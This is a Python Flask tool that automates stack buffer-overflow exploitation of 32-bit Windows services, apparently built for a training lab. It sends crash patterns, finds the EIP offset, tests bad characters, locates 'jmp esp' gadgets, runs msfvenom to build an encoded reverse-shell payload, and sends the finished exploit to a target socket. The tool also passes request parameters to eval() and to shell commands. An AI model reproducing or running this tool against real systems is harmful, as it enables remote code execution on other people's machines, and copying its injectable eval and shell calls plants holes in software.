#!/usr/bin/env python3

import argparse
from flask import Flask, request, json, request, send_file, render_template
from flask.templating import render_template
from flask_caching import Cache
from pwn import *
import os
import socket

cache = Cache()

api = Flask(__name__)

cache.init_app(app=api,
               config={
                   "CACHE_TYPE": "filesystem",
                   'CACHE_DIR': '/tmp/cache',
                   "CACHE_DEFAULT_TIMEOUT": 9999999999,
                   "DEBUG": True
               }
               )
redirect = '''<meta http-equiv="refresh" content="0;url=/">'''
parser = argparse.ArgumentParser(
    description='Revshell generator for windows x32')
parser.add_argument('ltun', help='adapter name for getting the rev shell')
parser.add_argument(
    'lport', type=int, help='listening port number for getting the rev shell')
args = parser.parse_args()


def os_execute(cmd, feedback=True, logging=True):
    with open('oscommands.log', 'a') as f:
        f.write(cmd + "\n")
    if feedback:
        with os.popen(cmd) as p:
            return p.read()
    os.popen(cmd)


def get_adapters_ip(network_adapter):
    piped = ["/usr/sbin/ip addr"]
    piped.append("/usr/bin/grep " + network_adapter)
    regex = "'\''(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'\''"
    piped.append(
        f"/usr/bin/grep -Eo {regex}")
    piped.append("/usr/bin/head -n 1")
    execute = " | ".join(piped)
    ip_addr_with_enter = os_execute(execute, feedback=True, logging=False)
    return ip_addr_with_enter.replace('\n', '')


def get_bad_chars(raw=False):
    raw_bad_chars = cache.get("bad_chars")
    if raw:
        return raw_bad_chars
    bad_chars = []
    for bad_char in raw_bad_chars:
        bad_chars.append(format(ord(bad_char), '#04x'))
    bad_chars = list(sorted(set(bad_chars)))
    return bad_chars


def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()


def generate_bad_chars(bad_chars_array=[]):
    filterd = b""
    for i in range(0x00, 0x100):
        if not (i in b"".join(bad_chars_array)):
            filterd += chr(i).encode('latin-1')
        else:
            pass
    return filterd


def msf_patern(len=1024):
    return os_execute(f'/usr/bin/msf-pattern_create -l {str(len)}').strip()


def make_exploit():
    try:
        pass
    except:
        pass


with open('ip_target', 'r') as f:
    cache.set("ip", f.read().strip())
cache.set("port", "1337")
cache.set("pre_msg", "OVERFLOW1 ")
cache.set("post_msg", "")
cache.set("bad_chars", [b"\x00", b"\x0a"])


@api.route("/generate_opcodes")
def generate_opcodes():
    """
importaint functions are:
jmp esp

    """
    try:
        opcodes = "jmp 0\njmp 1\n"
        opcodes = request.args.get("generate_opcodes")
    except:
        return "run with args"
    if 'jmp esp' in opcodes:
        opcodes_string = r'\xFF\xE4'
    else:
        opcodes = os_execute(
            'printf "' + opcodes.replace(r'\n', r'\\n') + '" | /usr/bin/msf-nasm_shell 2>/dev/null | cut -d " " -f 3,5')
        opcodes_string = ""
        for i in opcodes.replace(" ", "").split('\n'):
            # print(i)
            for j in range(0, len(i) - 1, 2):
                opcodes_string += "\\x" + i[j:j+2]
        opcodes_string = opcodes_string.replace(
            "\\x00", '')
    bad_chars = "".join(get_bad_chars()).replace('0x', r'\x')
    mona_string = '!mona find -s "' + opcodes_string + '" -cpb "' + bad_chars + '"'
    mona_optional = mona_string + ' -m "abc.dll"'

    return f'# opcode:</br>{opcodes_string}</br># find modules with:</br>!mona modules</br># get opcode in all: </br>{mona_string}</br># get opcode in specific dll:</br>{mona_optional}'


@api.route("/set_bad_chars")
def set_bad_chars():
    """
    example:
    curl -G -X GET --data-urlencode "set_bad_chars=['0x00', '0x0a', '0x41', '0x42', '0x43']" --data-urlencode 'port=1337' 'http://localhost:5000/set_bad_chars'
    or (will return the same)
    curl -G -X GET --data-urlencode "set_bad_chars=['0x00', '0x0a', 'A', 'B', 'C']" --data-urlencode 'port=1337' 'http://localhost:5000/set_bad_chars'
    """
    bad_chars_raw = request.args.get("set_bad_chars")
    bad_chars = eval(bad_chars_raw)
    bad_chars_final = []
    for i in bad_chars:
        test = f"b'{i}'".replace(r"'0x", r"'\x")
        test = eval(test)
        bad_chars_final.append(test)
    cache.set("bad_chars", bad_chars_final)
    return f"bad chars = " + str(get_bad_chars()) + redirect


@api.route("/ip_port")
def ip_port():
    cache.set("ip", request.args.get("ip"))
    cache.set("port", request.args.get("port"))
    ip = cache.get("ip")
    port = cache.get("port")
    return f"target = {ip}:{port}" + redirect


def send_payload(payload):
    # print(f'msg = {msg}')
    pre_msg = cache.get('pre_msg')
    post_msg = cache.get('post_msg')

    if pre_msg == None:
        pre_msg = b''
    if post_msg is None:
        post_msg = b''
    command = pre_msg.encode('latin-1')
    if type(payload) is None:
        pass
    if type(payload) is type(''):
        command += payload.encode('latin-1')
    if type(payload) is type(b''):
        command += payload
    command += post_msg.encode('latin-1')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = cache.get('ip')
    port = cache.get('port')
    s.connect((ip, int(port)))
    s.send(command)
    s.close()
    return command


@api.route("/send_payload_web")
def send_payload_web():
    create_payload()
    send_payload(cache.get('payload'))
    return 'done'


@api.route("/set_payload_length")
def run_offset():
    if request.method == "GET" or request.method == "POST":
        cache.set("payload_length", int(
            request.args.get("set_payload_length")))
        payload_length = str(cache.get("payload_length"))
        return f"payload length is: {payload_length}" + redirect


@api.route("/set_nop_sled_length")
def set_nop_sled_length():
    if request.method == "GET" or request.method == "POST":
        cache.set("nop_sled_length", int(
            request.args.get("set_nop_sled_length")))
        nop_sled_length = str(cache.get("nop_sled_length"))
        return f"Nopsled length is: {nop_sled_length}" + redirect


@api.route("/get_offset_eip_from_eip")
def get_offset_eip_from_eip():
    if request.method == "GET" or request.method == "POST":
        cache.set("get_offset_eip_from_eip",
                  request.args.get("get_offset_eip_from_eip"))
        cache.set('offset_eip', str(
            cyclic_metasploit_find(eval('0x' + cache.get('get_offset_eip_from_eip')))))
        return cache.get('offset_eip') + redirect


@api.route("/set_offset_eip_from_len")
def set_offset_eip_from_len():
    if request.method == "GET" or request.method == "POST":
        cache.set('offset_eip', request.args.get("set_offset_eip_from_len"))
        return cache.get('offset_eip') + redirect


@api.route("/generate_shellcode", methods=['GET', 'POST'])
def generate_shellcode():
    lport = args.lport
    adapter_name = args.ltun
    shelltype = request.args.get("shelltype")
    if shelltype is None:
        shelltype = request.form.get("shelltype")
    cache.set("shelltype", shelltype)
    shelltype = cache.get('shelltype')
    bad_chars = get_bad_chars()
    bad_chars = " " + " ".join(bad_chars)
    bad_chars = bad_chars.replace(r' 0x', r'\x')
    flags = []
    flags.append('-b "' + bad_chars + '"')
    flags.append("-f python")
    flags.append("-a x86")
    flags.append("--platform Windows")
    if shelltype == '3':
        print('making calc.exe shellcode.')
        flags.append("-p windows/exec cmd=calc.exe")
    elif shelltype == '2':
        print('making cmd shellcode.')
        flags.append("-p windows/exec cmd=cmd.exe")
    else:
        print('making rev shell shellcode.')
        lhost = get_adapters_ip(adapter_name)
        cache.set("lhost", lhost)
        flags.append("-p windows/shell_reverse_tcp")
        flags.append("LHOST="+lhost)
        flags.append("LPORT="+str(lport))
        flags.append("-e x86/shikata_ga_nai")
    flags.append('2> /dev/null')
    cmd = " ".join(flags)
    msfvenom = "/usr/bin/msfvenom " + cmd
    msfvenom_output = os_execute(msfvenom)
    shellcode = b''
    for i in msfvenom_output.strip().split('\n'):
        shellcode += eval("b'" + i.split('"')[-2] + "'")
    cache.set('shellcode', shellcode)
    return ":)" + redirect


def get_ip_port():
    if cache.get("ip") != None and cache.get("port") != None:
        ip = cache.get("ip")
        port = cache.get("port")
        return f"{ip}:{port}"
    else:
        return "ip and or port is not set."


def double_val(val1, val2):
    val1_without_spaces = val1.replace(' ', '_')
    val2_without_spaces = val2.replace(' ', '_')
    uri_name = f"{val1_without_spaces}_{val2_without_spaces}"
    return f"""<form action="/{uri_name}">
<label for="{val1_without_spaces}">{val1}:</label>
<input type="text" id="{val1_without_spaces}" name="{val1}">
<label for="{val1_without_spaces}">{val2}:</label>
<input type="text" id="{val1_without_spaces}" name="{val2}">
<input type="submit" value="run {uri_name}">
</form>"""


def single_val(val):
    val_without_spaces = val.replace(' ', '_')
    uri_name = f"{val_without_spaces}"
    return f"""<form action="/{uri_name}">
<label for="{val_without_spaces}">{val}:</label>
<input type="text" id="{val_without_spaces}" name="{val}">
<input type="submit" value="run {uri_name}">
</form>"""


def single_button(val):
    val_without_spaces = val.replace(' ', '_')
    uri_name = f"{val_without_spaces}"
    return f"""<form action="/{uri_name}">
<input type="submit" value="run {uri_name}">
</form>"""


def build_exploit(payload="`payload`"):
    payload_incl_pre_post = ""
    try:
        payload_incl_pre_post += cache.get("pre_msg")
    except:
        pass
    payload_incl_pre_post += payload
    try:
        payload_incl_pre_post += cache.get("post_msg")
    except:
        pass
    return payload_incl_pre_post


@api.route('/send_patern')
def send_patern():
    if request.method == "GET" or request.method == "POST":
        payload_length = cache.get('payload_length')
        if payload_length == None:
            return "run set_payload_length first."
        send_payload(msf_patern(payload_length))
        return "payload send." + redirect


@api.route('/pre_msg')
def pre_msg():
    if request.method == "GET" or request.method == "POST":
        cache.set("pre_msg",
                  request.args.get("pre_msg").replace('\\n', '\n')
                  )
        return "payload will be:</br>" + build_exploit().replace('\n', "</br>") + redirect


@api.route('/post_msg')
def post_msg():
    if request.method == "GET" or request.method == "POST":
        cache.set("post_msg",
                  request.args.get("post_msg").replace('\\n', '\n')
                  )
        return "payload will be:</br>" + build_exploit().replace('\n', "<br>") + redirect


def cache_get_without_error(s, pre_string="", post_string=""):
    try:
        retval = cache.get(s)
        if retval != None:
            return f"{pre_string}{str(retval)}{post_string}"
        else:
            pass
    except:
        pass
    return ""


def create_payload():
    try:
        pass
    except:
        pass

    payload = b""
    try:
        size_filler = int(cache.get('offset_eip'))
        payload += b"A"*size_filler
    except:
        pass

    try:
        payload += cache.get('jump_adress')
    except:
        pass

    try:
        offset = b"\x90" * cache.get('nop_sled_length')
        payload += offset
    except:
        pass
    try:
        payload += cache.get('nop_sled_length')
    except:
        pass
    try:
        payload += cache.get('shellcode')
    except:
        pass
    try:
        buffer_len = int(cache.get("payload_length")) - len(payload)
        if buffer_len > 0 and buffer_len < 500000:
            payload += b"D" * buffer_len
    except:
        pass

    cache.set('payload', payload)


@api.route("/set_jump_adress")
def set_jump_adress():
    if request.method == "GET" or request.method == "POST":
        jump_adress = request.args.get("set_jump_adress")
        cache.set("jump_adress", p32(eval(f"0x{jump_adress}")))
        jump_adress = cache.get("jump_adress")
        return f"Jump adress set to: {jump_adress}" + redirect


@api.route('/send_bad_chars')
def send_bad_chars():
    filler = int(cache.get('offset_eip'))
    payload = b'A' * filler
    payload += p32(0xdeadbeef)
    payload += generate_bad_chars(get_bad_chars(raw=True))
    return f"send: {send_payload(payload)}" + redirect


@api.route("/")
def home():
    t = '&emsp;'
    menu = "<html><body>"
    menu += cache_get_without_error("ip", f"- Target: " + 7*t,
                                    post_string=":") + cache_get_without_error("port", post_string="")
    menu += "</br>- Payload preview: " + t*2 + \
        build_exploit('`payload`').replace('\n', '\\n')
    menu += cache_get_without_error("payload_length",
                                    pre_string="</br>- Length of payload: " + t)

    try:
        jump_adress = cache.get('jump_adress')
        menu += cache_get_without_error("jump_adress",
                                        pre_string="</br>- Jump adress: " + t*4,
                                        post_string='')
    except:
        pass

    try:

        menu += " original: ("
        menu += list(map(hex, unpack_many(jump_adress, 32,
                                          endian='little',
                                          sign=False
                                          )))[0][2:]
        menu += ")"
    except:
        pass
    menu += cache_get_without_error("nop_sled_length",
                                    pre_string="</br>- Nop sled length: " + t*2)
    menu += cache_get_without_error("offset_eip",
                                    pre_string=f"</br>- Offset eip:  " + t*5 + " ")
    menu += "</br>- Bad chars: " + t*5 + str(get_bad_chars())
    menu += double_val('ip', 'port')
    menu += single_val('pre_msg')
    menu += single_val('post_msg')
    menu += single_val("set_payload_length")
    menu += single_button('send_patern')
    menu += single_val("get_offset_eip_from_eip")
    menu += single_val("set_offset_eip_from_len")
    menu += single_val("set_bad_chars")
    menu += render_template('download.html')
    menu += single_button('send_bad_chars')
    menu += single_val("generate_opcodes")
    menu += single_val("set_jump_adress")
    menu += single_val("set_nop_sled_length")
    menu += """<form action="/generate_shellcode" method="POST">
    Generate payload: 
    <select name="shelltype" id="myselect" onchange="this.form.submit()">
        <option value="0">change_me</option>
        <option value="1">rev_shell</option>
        <option value="2">cmd</option>
        <option value="3">calc</option>
    </select>
</form>"""
    create_payload()
    menu += cache_get_without_error('payload', 'payload: ')
    menu += single_button('send_payload_web')
    menu += render_template('download_payload.html')
    menu += "</body></html>"
    return menu


@api.route('/download_bad_chars')
def download_bad_chars():
    with open('bad_chars.txt', mode="wb") as f:
        f.write(generate_bad_chars(get_bad_chars(True)))
    # shutdown_server()
    return send_file("bad_chars.txt", as_attachment=True)


@api.route("/download_payload")
def download_payload():
    create_payload()
    with open('payload.txt', 'w') as f:
        payload = cache.get('pre_msg')
        payload += cache.get('payload').decode('latin-1')
        payload += cache.get('port_msg')
        f.write(payload)
    return send_file("payload.txt", as_attachment=True)


cache.set('lport', args.lport)
api.run(host="0.0.0.0", port=5000)
